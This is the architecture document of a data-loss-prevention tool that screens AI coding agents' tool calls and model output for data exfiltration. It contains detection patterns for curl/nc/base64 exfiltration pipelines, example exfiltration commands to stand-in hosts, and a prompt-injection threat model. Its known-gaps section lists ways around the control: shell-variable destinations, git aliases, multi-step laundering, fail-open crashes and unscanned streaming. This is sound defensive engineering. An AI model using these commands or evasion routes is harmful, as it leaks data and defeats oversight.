# Architecture

How AgentX DLP is built and why. `POLICY.md` is the source of truth for
**what is blocked and why it is on the list**; this document is the source of
truth for **where enforcement physically sits, what each surface can and cannot
see, and where it fails open**.

Everything described here as working has been read out of the code. Anything not
yet implemented lives in [§7 Known gaps](#7-known-gaps--next-steps) and nowhere
else.

---

## 1. Threat model

Four actors, in ascending order of intent. Coverage is stated honestly: this is
an agent-boundary control, not an endpoint agent.

| Actor | Behaviour | Coverage | Mechanism | Defeated by |
|-------|-----------|----------|-----------|-------------|
| **Careless insider** | Asks the agent for help, accepts whatever command it proposes, does not read it. Pastes an architecture diagram into a gist because the agent suggested it. | **Well covered** | Layer 1 is deterministic and blocks before execution (`exit 2`); the block text names an approved alternative | Nothing they would plausibly do — they are not trying to get around a control |
| **Rushed insider** | Knows the policy, is behind on a deadline, wants the fastest path. Would rather not be stopped. | **Friction + audit trail** | Same block, plus every advisory is appended to `~/.claude/agentx-dlp.log` | Retrying with a destination the allowlist does not recognise as a URL (shell variable, remote alias), or splitting the transfer across two tool calls |
| **Malicious insider** | Actively wants the data out and will work around a control they know exists. | **NOT covered — explicitly out of scope** | — | Trivially: `/plugin` disable, editing `dlp/allowlist.js`, an out-of-band shell, AirDrop, USB, phone camera. Endpoint DLP (endpoint DLP) and network DLP own this actor; see `POLICY.md` §6 |
| **Hijacked agent / indirect prompt injection** | A README, issue comment, MCP tool result, or web page instructs the agent to exfiltrate. The human never asked for it. | **Partially covered — at egress only** | The injected instruction becomes a tool call, and the tool call is screened like any other. Destination and content checks do not care who authored the intent | Injection that stays inside approved destinations (e.g. writes to an approved bucket, comments on an approved repo); multi-step laundering; anything Layer 1 rates `medium` when Layer 2 is unavailable |

Two structural consequences worth stating plainly:

1. **The control is co-operative.** The hook runs inside the user's own agent
   process, from a plugin the user installed and can uninstall. It raises the
   cost of an accident to near-certain interception and the cost of deliberate
   theft by approximately nothing. That is a deliberate scope choice, not an
   oversight.
2. **Injection is caught late.** There is no inspection of *inbound* content
   (tool results, fetched pages) — only of the outbound call the agent
   subsequently makes. An injected instruction that never produces an egress
   tool call is invisible to this tool.

---

## 2. Where each surface sits

Three enforcement surfaces at three different boundaries. Only one of them can
block a tool call, and only one of them can see the model's own words.

```
 ┌──────┐
 │ User │  prompt
 └──┬───┘
    ▼
 ┌───────────────────────────────────────────────────────────────┐
 │ Agent runtime          Claude Code   |   Cursor / VS Code     │
 └──┬─────────────────────────────────────────────────▲──────────┘
    │ (1) inference request                           │ (2) completion
    ▼                                                 │
 ╔═══════════════════════════════════════════════════════════════╗
 ║ litellm/   LiteLLM proxy guardrail                            ║
 ║            (in path only if the client is pointed at it)      ║
 ║                                                               ║
 ║   async_pre_call_hook   → scan PROMPT   → 400 on CUSTOMER     ║
 ║                                           DATA / RESTRICTED   ║
 ║   async_post_call_...   → scan RESPONSE → 400 on public-share ║
 ║     _success_hook         + tool_call     suggestion, secret, ║
 ║                           arguments       unapproved host     ║
 ╚═══════════════════════════════╤═══════════════════════════════╝
                                 │ upstream call
                                 ▼
                     model vendor API (Anthropic / OpenAI / …)

    ── the agent now has a completion and picks a tool ──

 ┌───────────────────────────────────────────────────────────────┐
 │ Tool call:  Bash · Write · Edit · WebFetch · mcp__* · Task    │
 └───────────────────────────┬───────────────────────────────────┘
                             │ (3) PreToolUse event on stdin
                             ▼
 ╔═══════════════════════════════════════════════════════════════╗
 ║ dlp/exfil-hook.js        hooks.json: PreToolUse, matcher ".*" ║
 ║                          node, 15 s timeout, no deps (Layer 1)║
 ╚═══════════╤═══════════════════════════════════╤═══════════════╝
      exit 0 │                            exit 2 │
             ▼                                   ▼
   (4) tool executes                 call never runs; stdout is
                                     shown to the user AND fed
                                     back to the model as context


 off to the side, observing — never in the decision path:

 ┌ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ┐
   src/   VS Code / Cursor extension  (ResponseScanner)
 │                                                             │
   watches:  active editor text · document saves · clipboard
 │           (2 s poll) · terminal data · which sensitive      │
             files are open
 │                                                             │
   emits:    warning toast → webview detail panel → in-memory
 │           ChatLogger ring buffer (1000 entries)             │
 └ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ┘
```

| Surface | Boundary | Verdict power | Sees | Cannot see |
|---------|----------|---------------|------|-----------|
| `dlp/` PreToolUse hook | Between agent decision and tool execution | **Blocking** (`exit 2`) | Exact `tool_name` + `tool_input`, the transcript path, the local filesystem | The model's prose; anything the agent decided not to turn into a tool call; the resolved value of a shell variable or git remote alias |
| `litellm/` proxy guardrail | Between agent and model vendor | **Blocking** (HTTP 400) | Full prompt text, full response text, `tool_calls` arguments | Whether the tool call ever executed; any local file; anything in a session not routed through the proxy |
| `src/` Cursor extension | Editor / OS clipboard / terminal | **Advisory only** | Editor buffers, saves, clipboard contents, terminal output, open-file set | Chat internals; it cannot stop anything, only warn after the fact |

The proxy and the hook are complements, not redundancy: the proxy is the only
surface that can see *"you could paste this in a public gist"* as text, and the
hook is the only surface that can see *`gh gist create arch.drawio`* as an
actual, about-to-run command.

---

## 3. Runtime flow — the hook pipeline

```
stdin: {session_id, transcript_path, tool_name, tool_input, …}
   │
   ├─ JSON.parse throws ──────────► stderr, exit 0        FAIL OPEN #1
   ├─ run() throws anything ──────► stderr, exit 0        FAIL OPEN #2
   ▼
┌───────────────────────────────────────────────────────────────┐
│ run(event) — router on tool_name                              │
└───┬──────────────────────┬─────────────────────┬──────────────┘
    │ "Bash"               │ "Write" / "Edit"    │ default: mcp__*,
    ▼                      ▼                     │ WebFetch, Task,
 handleBash          handleFileWrite             │ custom tools
                     (ADVISORY ONLY,             ▼
                      always exit 0)        handleGeneric
                                            evaluateMcpCall()
```

### 3.1 Bash — Layer 1, then Layer 2

```
handleBash(input.command)
   │  empty command ───────────────► exit 0                (no-op)
   ▼
LAYER 1  semantic-analyzer.analyze()      deterministic, no network
   │
   │ (a) OBFUSCATION   detectObfuscation()
   │     six same-line pipeline patterns, gap = [^\n]{0,200}?
   │     backslash continuations collapsed first
   │        hit ──────────────────────────► high, is_exfil, stop
   │
   │ (b) DIRECTION     isOutboundTransfer()
   │     ALWAYS_OUTBOUND list; curl needs -X write / payload /
   │     JSON header; wget needs --post-*; scp/rsync need a local
   │     source and a remote (colon) destination
   │        inbound ──────────────────────► none            (allow)
   │
   │ (c) DESTINATION   per-tool special cases, then
   │                   allowlist.classifyDestinations()
   │     gist without --secret · repo create without
   │     --private/--internal · git push to a non-approved org ·
   │     docker push to a non-*.your-company.com registry ·
   │     npm publish without --access restricted
   │        approved ─────────────────────► none            (allow)
   │
   │ (d) DATA SOURCE   detectDataSource()
   │     @file refs, pipe input, stdin @-, process substitution
   │        payload    + unapproved dest ─► high
   │        no payload + unapproved dest ─► medium
   │        unresolvable dest + sensitive file name ─► medium
   │
   │ (e) CONTENT TIER  scanText(command)
   │                 ⊕ scanCommandReferencedFiles(command)
   │                   (local reads, bounded to 512 KiB per file)
   │     escalates only when the data is *leaving*:
   │        confidential ────────────────► high
   │        customer / restricted ───────► high + failClosed
   ▼
 risk == "high" && is_exfil ─────────────► block(), exit 2
   │
 risk == "medium" && is_exfil
   ‖  (!is_exfil && looksExternal(command))
   ▼
LAYER 2  intent-classifier.classifyIntent()
   │   claude-haiku-4-5-20251001 · max_tokens 60 · 3000 ms race
   │   cached ephemeral system prompt · assistant prefill
   │   '{"is_exfil":' · last 4 transcript turns, 250 chars each
   │
   ├─ SDK unresolvable ──────────► skipped                FAIL OPEN #3
   ├─ no credentials found ──────► skipped                FAIL OPEN #4
   ├─ API error / 3 s timeout ───► skipped                FAIL OPEN #5
   ├─ unparseable JSON ──────────► skipped                FAIL OPEN #6
   │
   ├─ is_exfil && risk ∈ {high, medium} ──► block(), exit 2
   └─ anything else ──────────────────────► exit 0
```

### 3.2 Write / Edit — advisory only, never blocks

```
handleFileWrite(input)
   │
   ├─ scanText(content).tier == "restricted"
   │        └─► advise() → ~/.claude/agentx-dlp.log
   │
   ├─ per line, if the line mentions a transfer tool:
   │      layer1(line); high-risk hits collected
   │        └─► advise() "would be blocked at execution"
   │
   └─────────────────────────────────────────► exit 0  (always)
```

Writing a file locally is not exfiltration. The exfil happens later, when the
script is executed (caught by `handleBash`) or pushed (caught by the git /
MCP paths). Blocking here produced false positives on READMEs, policy docs, and
test fixtures that merely *mention* these commands.

The router's `switch` matches the two literal tool names `Write` and `Edit` and nothing
else. Any other file-mutating tool a host exposes (`MultiEdit`, `NotebookEdit`, …) falls
through to `default:` and is evaluated by `handleGeneric`, where it *can* block — it is
not covered by this advisory-only carve-out.

### 3.3 Generic / MCP

```
handleGeneric(toolName, toolInput)
   │  !toolName || !toolInput ────────────► exit 0        FAIL OPEN #7
   ▼
evaluateMcpCall()
   │
   ├─ classifyTool() == "read"  (READ_PATTERNS win over WRITE_
   │     PATTERNS; explicit read-only whitelist) ─► allow  → exit 0
   │
   ├─ PRIMARY DESTINATION — the one parameter that *is* the target
   │     github owner/organization · email to/cc/bcc ·
   │     browser navigate/upload url
   │        unapproved ──────────────────► block, exit 2
   │        (failClosed if content tier is customer/restricted)
   │
   ├─ inspectInput() walks every string in the JSON tree for:
   │     URLs · emails · github.com-anchored repo refs ·
   │     sensitive file paths · command-shaped segments ·
   │     secrets / PII / classification markers
   │
   ├─ embedded exfil command ────────────► block, exit 2
   ├─ external target + customer/restricted ─► block + failClosed
   ├─ external target + sensitive file or confidential ─► block
   ├─ external target alone ─────────────► defer → LAYER 2
   └─ nothing ───────────────────────────► allow → exit 0
```

### 3.4 Exit codes

| Code | Meaning | Emitted where |
|------|---------|---------------|
| `0` | Allow the tool call | Every allow path; every fail-open path; all Write/Edit |
| `2` | Block. `stdout` is shown to the user and fed back to the model | `block()` in `exfil-hook.js` |
| `1` | Non-blocking error (contract-level) | Never intentionally emitted — the hook converts its own errors into `exit 0` |

### 3.5 Every fail-open point, in one place

| # | Trigger | Result |
|---|---------|--------|
| 1 | `stdin` is not valid JSON | stderr, `exit 0` |
| 2 | Any uncaught throw inside `run()` | stderr, `exit 0` |
| 3 | `@anthropic-ai/sdk` not resolvable from the plugin location | Layer 2 skipped |
| 4 | No `ANTHROPIC_API_KEY` / `ANTHROPIC_AUTH_TOKEN` / `~/.claude/.credentials.json` | Layer 2 skipped |
| 5 | Haiku call errors or exceeds the 3000 ms race | Layer 2 skipped |
| 6 | Haiku output does not parse as the expected JSON | Layer 2 skipped |
| 7 | `tool_name` or `tool_input` missing on a generic call | `exit 0` |
| 8 | Referenced file is absent, unreadable, or larger than 512 KiB | Contributes `tier: "none"` — silently unscanned |
| 9 | Appending to the advisory log throws | Swallowed; the hook continues |
| 10 | Hook process exceeds the 15 s `hooks.json` timeout | Host decides; no verdict from us |

Fail-closed is a **content-tier policy, not a crash policy**: CUSTOMER DATA and
RESTRICTED leaving to an unapproved destination are blocked even when the
destination could not be resolved, and the block message states the decision
cannot be overridden inline. If the hook itself crashes, it fails open for every
tier — see [§7](#7-known-gaps--next-steps).

---

## 4. Module map

### `dlp/` — Claude Code plugin (Node, no runtime dependency for Layer 1)

| File | Responsibility | Key exports |
|------|----------------|-------------|
| `exfil-hook.js` | Executable entry point. Reads the stdin event, routes on `tool_name`, formats the block banner, owns `exit 0` / `exit 2`, appends advisories | *(none — a CLI; its API is the exit code and `stdout`)* |
| `semantic-analyzer.js` | Layer 1. Structural `SOURCE → TRANSFORM → DESTINATION` decomposition of a shell command, plus content-tier escalation | `analyze`, `analyzeFlow`, `detectDataSource`, `isOutboundTransfer`, `detectObfuscation` |
| `content-scanner.js` | "What is this data?" Classification markers, secret/credential detectors, PII detectors with Luhn, tier arithmetic, bounded local file reads | `scanText`, `scanFile`, `scanCommandReferencedFiles`, `maxTier`, `tierLabel`, `isFailClosedTier`, `describeContent`, `TIER_RANK` |
| `mcp-handler.js` | Generic + MCP tool DLP. Read/write name classification, primary-destination extraction, recursive `tool_input` inspection, verdict `block`/`defer`/`allow` | `classifyTool`, `inspectInput`, `evaluateMcpCall`, `describeFindings` |
| `allowlist.js` | Approved destinations: hosts, GitHub orgs, bucket prefixes. Splits a command's destinations into approved / unapproved | `APPROVED_HOSTS`, `APPROVED_GITHUB_ORGS`, `APPROVED_BUCKET_PREFIXES`, `isApprovedHost`, `extractHost`, `extractUrls`, `extractGitHubOrg`, `extractBucketName`, `isApprovedBucket`, `classifyDestinations` |
| `patterns.js` | Sensitive file types (diagram / IaC extensions, architecture-ish names) and the legacy literal exfil-command and AI-suggestion pattern lists | `EXFIL_COMMANDS`, `EXFIL_SUGGESTION_PATTERNS`, `SENSITIVE_FILE_EXTENSIONS`, `SENSITIVE_FILE_NAME_PATTERNS`, `checkCommand`, `scanResponseText`, `isSensitiveFile` — **only `isSensitiveFile` is consumed by the hook pipeline** |
| `intent-classifier.js` | Layer 2. Lazy SDK load, credential discovery, transcript window, prompt-cached Haiku call, JSON parse, fail-open on everything | `classifyIntent`, `discoverCredentials` |
| `bench-layer2.js` | Latency benchmark for Layer 2 over five fixed samples | *(none — a script)* |
| `setup.sh` | **Legacy** standalone installer that merges the hook into `~/.claude/settings.json` via `jq`. Superseded by the plugin manifests | *(none — a script)* |

### `src/` — VS Code / Cursor extension (TypeScript → `out/`)

| File | Responsibility | Key exports |
|------|----------------|-------------|
| `extension.ts` | Activation, four command registrations, auto-start gated on `agentxDlp.enabled`, the log webview | `activate`, `deactivate` |
| `responseScanner.ts` | All observation: active editor, document saves, 2 s clipboard poll, terminal data (behind a `typeof api.onDidWriteTerminalData === 'function'` guard, so it silently does nothing on hosts that do not expose it), open-sensitive-file tracking, toasts, detail panels, status bar | `ResponseScanner` |
| `dlpEngine.ts` | Extension-local copies of the command and suggestion patterns, **plus its own third copy of the sensitive-extension / sensitive-name lists** (this is the one `ResponseScanner`'s open-file tracking consults, not `intentAnalyzer.ts`'s); `scanAIResponse` / `scanCommand` / `isSensitiveFile` | `DLPEngine`, `DLPMatch`, `DLPResult` |
| `intentAnalyzer.ts` | Despite the name, a **synchronous TypeScript port of Layer 1** — obfuscation, direction, destination, data-source. Makes no API call; `analyzeAsync` is a shim over `analyze` | `IntentAnalyzer`, `IntentResult` |
| `chatLogger.ts` | In-memory ring buffer (1000 entries) with level filtering and JSON export | `ChatLogger`, `LogEntry` |

Command ids: `agentx-dlp.start` / `.stop` / `.showLogs` / `.clearLogs`.

### `litellm/` — LiteLLM proxy guardrail (Python, stdlib only for the detectors)

| File | Responsibility | Key exports |
|------|----------------|-------------|
| `agentx_dlp_guardrail.py` | `CustomGuardrail` subclass. `async_pre_call_hook` scans the prompt; `async_post_call_success_hook` scans response text and `tool_calls` arguments; raises `HTTPException(400)` in `block` mode, rewrites spans in `redact` mode | `AgentXDLPGuardrail` |
| `dlp_patterns.py` | Python port of the detectors: tier ranking, approved hosts/orgs, known public exfil hosts, suggestion phrases, secrets, PII with Luhn, classification markers | `scan_content`, `scan_suggestions`, `scan_external_destinations`, `is_approved_host`, `max_tier`, `tier_label`, `is_fail_closed_tier`, `describe`, `TIER_RANK`, `APPROVED_HOST_SUFFIXES`, `APPROVED_GITHUB_ORGS`, `PUBLIC_EXFIL_HOSTS` |
| `test_patterns.py` | Ten-case fixture harness for the detectors. Runs on stdlib alone — **does not import litellm** | `response_blocks`, `main` |
| `config.yaml` | Registers the guardrail twice (`pre_call`, `post_call`) and declares the model list | *(config)* |
| `README.md` | Proxy-specific setup notes | *(docs)* |

### Manifests

| File | Purpose | Notable contents |
|------|---------|------------------|
| `.claude-plugin/plugin.json` | Plugin identity | `agentx-dlp`, version `0.1.2` |
| `.claude-plugin/marketplace.json` | Marketplace listing | marketplace `agentx-local`, plugin source `"./"`, version `0.1.2`, category `security` |
| `hooks/hooks.json` | Hook wiring | `PreToolUse`, matcher `".*"`, `node "${CLAUDE_PLUGIN_ROOT}/dlp/exfil-hook.js"`, timeout `15` |
| `package.json` | Extension manifest | `agentx-dlp` `0.1.2`, four commands, `agentxDlp.enabled`, `@anthropic-ai/sdk` as the only runtime dependency. This version is the **extension's**, tracked separately from the plugin manifests — CI checks parity only between `plugin.json` and `marketplace.json`, never against this file |
| `tsconfig.json` | TS build | `rootDir: src`, `outDir: out`, `strict: true`, CommonJS / ES2020 |

---

## 5. The two questions

Layer 1 is built around two independent questions with two independent
implementations.

| Question | Module | Produces |
|----------|--------|----------|
| **Where is this data going?** | `semantic-analyzer.js` + `allowlist.js` | Direction (outbound?) and a destination split into `approved[]` / `unapproved[]` |
| **What is this data?** | `content-scanner.js` | A tier in `none < public < confidential < customer < restricted`, plus labelled findings |

### The AND gate

For the **content-escalation path**, both answers are required. In
`semantic-analyzer.analyze()`:

```
tier ∈ {none, public}                       ─► return unchanged
leaving = base.is_exfil
       ‖ (isOutboundTransfer(cmd) && !destinationWasApproved)
leaving == false                            ─► return unchanged
                                               "sensitive, but internal"
leaving == true && tier == confidential      ─► high
leaving == true && tier ∈ {customer,
                           restricted}       ─► high + failClosed
```

`mcp-handler.evaluateMcpCall()` applies the same gate over a JSON tree:
`hasExternalTarget` (unapproved host, non-`@your-company.com` email, or non-approved
GitHub org) AND a content tier. Sensitive *content* going to Slack is allowed;
the same content going to a webhook is not. An unapproved host mentioned with no
sensitive payload is not blocked either — it becomes `defer`.

### Where the gate does not apply — and why that is intentional

Three paths block on a **single** factor, because for them the destination *is*
the violation and no content inspection would change the answer:

| Single-factor block | Rationale |
|---------------------|-----------|
| `gh gist create` without `--secret`; `gh repo create` without `--private`/`--internal`; `git push` to a non-approved org; `docker push` to a non-approved registry; `npm publish` without restricted access | Publishing to a public destination is the act being prohibited. `POLICY.md` §3.2 |
| Obfuscation pipelines (`base64 … \| curl`, `gzip … \| nc`, DNS exfil, `curl … \| sh`) | The technique has no legitimate reading. `POLICY.md` §3.1 |
| MCP primary destination — GitHub owner, email recipient, browser URL/upload | The parameter *is* the destination; an external value alone is sufficient. `POLICY.md` §3.5 |

Conversely `unapproved destination + data payload` is rated `high` on the
destination and payload-presence alone, without a content tier. The tier's job
is to **escalate**, never to be the sole gate for these rules.

### How the tier picks block vs fail-closed

| Tier | Leaving to an unapproved destination | Block message |
|------|--------------------------------------|---------------|
| `public` / `none` | No escalation | — |
| `confidential` | `risk = high`, `is_exfil = true` | Standard banner |
| `customer` (CUSTOMER DATA) | `risk = high`, `failClosed = true` | Adds: top-tier data is blocked on uncertainty and cannot be overridden inline |
| `restricted` | `risk = high`, `failClosed = true` | Same as above |

An **unresolved** destination still counts as a destination at *every*
escalating tier, not just the top two: `analyze()` computes
`dest = base.unapprovedDests?.[0] || '(unresolved external destination)'` once
and both branches use it. So `confidential` content on an outbound transfer
whose destination could not be resolved (a shell variable, say) blocks at
Layer 1 exactly as `restricted` does — the Layer 2 escalation path is never
reached, because `risk` is already `high`.

The only practical difference between the tiers is therefore the `failClosed`
flag and the extra banner line it prints. This is the policy rule that a
single RESTRICTED or public-internet factor sets the severity floor on its own.

---

## 6. Design decisions and trade-offs

### 6.1 Hook vs proxy — what each one physically cannot see

| | Hook (`dlp/`) | Proxy (`litellm/`) |
|-|---------------|--------------------|
| Sees the model's prose | **No** | Yes |
| Sees the exact command about to run | **Yes** | Only if it appears in a `tool_call` argument |
| Can read local files to classify them | **Yes** (bounded) | **No** |
| Knows whether the call executed | Yes — it decides | **No** |
| Works when the client is not proxied | Yes | **Not in path at all** |
| Works for a locally-hosted model | Yes | Only if routed through it |

Neither is sufficient. A model can suggest a gist without ever calling a tool
(prose only — proxy catches it, hook cannot). A user can type
`gh gist create arch.drawio` themselves with no model involvement (hook catches
it, proxy never sees it). Deploying both is the design; deploying either alone
is a documented partial.

### 6.2 Layer 1 deterministic, Layer 2 escalation only

Layer 1 makes every decision that can be made from syntax: direction,
destination, encoding technique, and content tier. It is regex and string work
with bounded local file reads — no network, no API key, no latency budget, and
identical output for identical input, which is what makes a *block* defensible
to the person who just got blocked.

Layer 2 exists for exactly one thing Layer 1 cannot do: read the conversation
and tell `medium` apart. `curl -X POST https://unknown-host.example -d @notes.md`
is not classifiable from syntax; whether the user spent the last four turns
setting up their own test server is. So Layer 2 is reached only from
`risk === "medium"`, from `defer`, or from a `none` verdict whose command still
`looksExternal()`. It can escalate `medium → block`. It can never downgrade a
Layer 1 `high` — that path has already exited 2 before any API call is made.
An LLM is a weak thing to make a deny decision with and a reasonable thing to
make a *second* deny decision with.

### 6.3 Fail open on Layer 2, fail closed on top-tier data

These are not in tension; they cover different uncertainty.

- **Layer 2 unavailable** (no SDK, no credentials, timeout, garbage JSON) means
  *we learned nothing new*. The correct action is whatever Layer 1 already
  concluded, which for these paths was "not clearly a violation". Blocking on
  infrastructure absence would mean a DLP tool that bricks the agent whenever a
  key rotates — and the first thing anyone does with a tool like that is
  uninstall it, taking Layer 1's real coverage with it.
- **CUSTOMER DATA / RESTRICTED leaving** means *we learned something bad and are
  merely unsure of the destination*. Uncertainty there resolves toward blocking,
  and the message says so, because a false positive costs a Slack message to
  `#security` and a false negative is regulated data on the public internet.

The honest limit: fail-closed only governs the *tier decision*. If the hook
process itself dies, every tier fails open. See §7.

### 6.4 Write / Edit advise instead of block

Writing a file locally moves nothing across the perimeter. Every real egress
step downstream of a write has its own check: executing the script hits
`handleBash`, pushing it hits the git and MCP paths, uploading it hits the
destination checks. Blocking at write time therefore adds no coverage and
subtracts a lot of usability — it makes it impossible to author a DLP test
fixture, a runbook, or this document, all of which contain the exact strings the
detectors look for. So `handleFileWrite` records two advisories (RESTRICTED
content written to a file; a line that would be blocked at execution) to
`~/.claude/agentx-dlp.log` and always exits 0.

### 6.5 Detectors duplicated across JS, TS, and Python

The same secret, PII, and classification detectors exist three times:
`dlp/content-scanner.js`, `src/dlpEngine.ts` + `src/intentAnalyzer.ts`, and
`litellm/dlp_patterns.py`. This was chosen for one reason: **each surface must
have zero runtime dependencies in its own ecosystem.** The hook must run from a
plugin directory where `node_modules` may not resolve; the extension ships as a
bundle with no Node subprocess; the guardrail must import under a Python proxy
that knows nothing about this repo.

The cost is real and already visible: the bounded-regex fix in §6.6 was applied
to `dlp/semantic-analyzer.js` and **not** to `src/intentAnalyzer.ts`, which
still carries the unbounded `[\s\S]*?` pipeline patterns. Parity is maintained
by hand and by reading, which does not scale.

What would replace it: a single declarative detector manifest (JSON or YAML —
id, tier, label, pattern, flags) checked into one place, with thin per-language
loaders and one conformance fixture set run against all three implementations in
CI. Detectors become data; only the loaders are code, and drift becomes a test
failure instead of a discovery.

### 6.6 The bounded-regex lesson

**Pipeline patterns must be same-line and length-bounded.** This is not a
style preference; an unbounded matcher was a live false-positive generator.

`dlp/semantic-analyzer.js` defines its gap as `GAP = '[^\n]{0,200}?'` and
collapses backslash continuations first, so a genuine multi-line command still
reads as one logical line. The earlier version used `[\s\S]*?`:

```
  BAD :  /\b(?:gzip|bzip2|xz|zip|tar)\b[\s\S]*?\|[\s\S]*?\b(?:curl|nc|wget|ssh)\b/
  GOOD:  /\b(?:gzip|bzip2|xz|zip|tar)\b[^\n]{0,200}?\|[^\n]{0,200}?\b(?:curl|nc|wget|ssh)\b/
```

Across a long document — a README, a Jira ticket, a markdown table — the tokens
`gzip`, `|`, and `curl` each appear *somewhere*. `[\s\S]*?` happily spans
hundreds of characters and many newlines to join three unrelated mentions into
one "active exfil pipeline". Every markdown table is a minefield, because `|` is
its column separator. Prose that merely discussed these tools was reported as
an attack.

The same failure mode had a second instance. The repo detector in
`mcp-handler.js` is now anchored:

```
  BAD :  any  word/word  token, whenever the string said "github"
  GOOD:  /github\.com[/:]([\w.-]+)\/([\w.-]+?)(?:\.git)?(?=[\s"'),;:]|$)/gi
```

Unanchored, `dlp/allowlist.js`, `test/run-tests.sh`, and
`.github/workflows/ci.yml` were all reported as unapproved repositories. A file
path is not a repository unless `github.com` says it is.

Generalised, this is the rule the codebase now follows in three places:

| Rule | Implementation |
|------|----------------|
| A pipeline is same-line and bounded | `GAP = [^\n]{0,200}?` after collapsing `\`-continuations |
| A repo needs a host anchor | `REPO_RE` requires a literal `github.com` |
| Prose is not a command | `COMMAND_HEAD` — a segment is a command only if it *begins* with a transfer tool; everything else becomes a non-blocking `advisoryMentions` entry |

`extractCommandCandidates()` splits on newline, `;`, `&&`, `||` — deliberately
**not** on a bare `|`, so `tar czf - x | nc host 4444` survives as one command
and is analysed as one.

---

## 7. Known gaps / next steps

Nothing in this section is implemented. Each item is a real hole, not a
hypothetical.

| Gap | Consequence | Direction |
|-----|-------------|-----------|
| **No PostToolUse scanning** | Indirect prompt injection is caught only if it produces an egress tool call. Content *returning* from a tool (fetched page, issue body, MCP result) is never inspected, so an injected instruction is unopposed until the agent acts on it | Add a PostToolUse hook that scans tool results for injection markers and for newly-arrived secrets, and taints the session |
| **No centralized SOC / Splunk emission** | Advisories go to `~/.claude/agentx-dlp.log` on the developer's own laptop. Nobody in security sees a block unless the developer says so. A comment calls that file "the natural feed for SOC/Splunk forwarding" — the forwarder does not exist | Structured JSON lines + a shipper, or emit directly to the Splunk HEC endpoint |
| **No monitor / shadow mode** | There is no way to measure the false-positive rate before turning enforcement on. Every rule change is deployed straight to blocking | A `AGENTX_DLP_MODE=monitor` env switch: run the full pipeline, log the verdict, always `exit 0` |
| **Multi-step lineage evades single-call analysis** | Every decision is made on one tool call in isolation. `cp secrets.env /tmp/notes.txt`, then upload `notes.txt` — the second call sees an innocuous filename. Layer 2 sees only the last four transcript turns | Session-scoped taint tracking: remember which paths were derived from sensitive sources |
| **No tamper resistance** | A user can disable the plugin, edit `dlp/allowlist.js`, or add their own host. There is no signing, no integrity check, no server-side policy fetch | Signed policy bundle fetched from an internal endpoint; report plugin state to the fleet inventory |
| **Streaming responses are not scanned by the LiteLLM guardrail** | `async_post_call_success_hook` only sees non-streamed responses. `async_post_call_streaming_iterator_hook` is named in a source comment and **not implemented**, so any streaming client — which is every interactive one — bypasses the response layer entirely | Implement the streaming iterator hook with a buffer window; block or truncate mid-stream |
| **Detector parity is manual** | Three implementations, hand-synchronised. `src/intentAnalyzer.ts` still has the unbounded `[\s\S]*?` obfuscation patterns that were fixed in `dlp/semantic-analyzer.js` | The declarative detector manifest + shared conformance fixtures from §6.5 |
| **`redact` mode does not redact content findings** | `_redact_response()` rewrites suggestion and destination spans only. Secrets and PII found by `scan_content` are detected, logged, and then **passed through** to the caller | Redact the matched spans from `scan_content` findings too, or restrict `redact` mode to suggestions and document it |
| **Crash fails open at every tier** | Fail-closed governs the tier decision, not process health. Any uncaught throw, or exceeding the 15 s hook timeout, allows the call — including RESTRICTED data | Watchdog + a separate minimal deny-list evaluator that runs even when the main pipeline throws |
| **Git remote aliases are invisible** | `git push origin main` is allowed unconditionally: no URL appears in the command, so `classifyDestinations` finds nothing. The reason string even reports "git push to approved destination" when no destination was ever resolved | Resolve the remote via `git config --get remote.<name>.url` before deciding |
| **Cloud-storage uploads under-classified** | `aws s3 cp report.csv s3://random-bucket/…` lands at `medium`, because `detectDataSource` does not treat an `s3 cp` positional source as a payload. With Layer 2 unavailable that is an allow | Teach `detectDataSource` the `aws s3` / `gsutil` argument shapes |
| **Shell-variable destinations** | `curl -X POST $UPLOAD_URL -d @notes.md` reaches `medium` at best, and only if the filename looks sensitive | Nothing clean at this layer; needs the taint tracking above |
| **Cursor extension has no Layer 2, and one dead command id** | `IntentAnalyzer` is a Layer 1 port that makes no API call, but a notification labels its findings `DLP [AI]`. Separately, `responseScanner.ts` sets `statusBarItem.command = 'cursor-chat-proxy.showLogs'`, a stale id — the registered command is `agentx-dlp.showLogs`, so clicking the status bar does nothing | Rename the class and its labels; fix the command id |
